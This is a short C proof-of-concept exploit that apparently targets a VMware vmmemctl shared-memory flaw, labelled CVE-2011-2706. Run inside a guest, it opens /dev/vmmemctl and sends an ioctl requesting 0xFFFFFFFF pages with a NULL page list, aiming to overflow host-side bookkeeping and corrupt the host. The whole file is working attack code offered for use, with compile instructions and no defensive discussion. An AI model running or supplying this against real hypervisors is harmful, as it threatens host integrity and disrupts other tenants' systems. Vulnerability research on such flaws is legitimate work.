/*
 * PoC for VMware vmmemctl shared-memory oversize (CVE-2011-2706)
 *
 * Interacts with the vmmemctl char device inside the guest to
 * request a shared-memory region with an enormous page_count,
 * overflowing host-side bookkeeping.
 *
 * Compile: gcc -o poc_vmmemctl poc_vmmemctl.c
 */

#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <unistd.h>

// vmmemctl ioctl magic & opcodes (reverse-engineered)
#define VMMEMCTL_MAGIC       'M'
#define VMMEMCTL_CREATE      _IOWR(VMMEMCTL_MAGIC, 2, struct mem_op)
#define VMMEMCTL_REMOVE      _IOWR(VMMEMCTL_MAGIC, 3, struct mem_op)

struct mem_op {
    uint32_t command;      // 2=create, 3=remove
    uint32_t page_count;   // number of pages
    uint64_t page_list;    // guest-side pointer to pages
};

int main() {
    int fd = open("/dev/vmmemctl", O_RDWR);
    if (fd < 0) { perror("open /dev/vmmemctl"); return 1; }

    struct mem_op op;
    op.command    = 2;           // CREATE_SHARED_MEMORY
    op.page_count = 0xFFFFFFFF;  // huge count to overflow host
    op.page_list  = 0;           // NULL list

    printf("[+] Requesting %u pages via VMMEMCTL_CREATE\n", op.page_count);
    if (ioctl(fd, VMMEMCTL_CREATE, &op) < 0) {
        perror("ioctl VMMEMCTL_CREATE");
    } else {
        printf("[+] ioctl returned, host likely corrupted\n");
    }

    close(fd);
    return 0;
}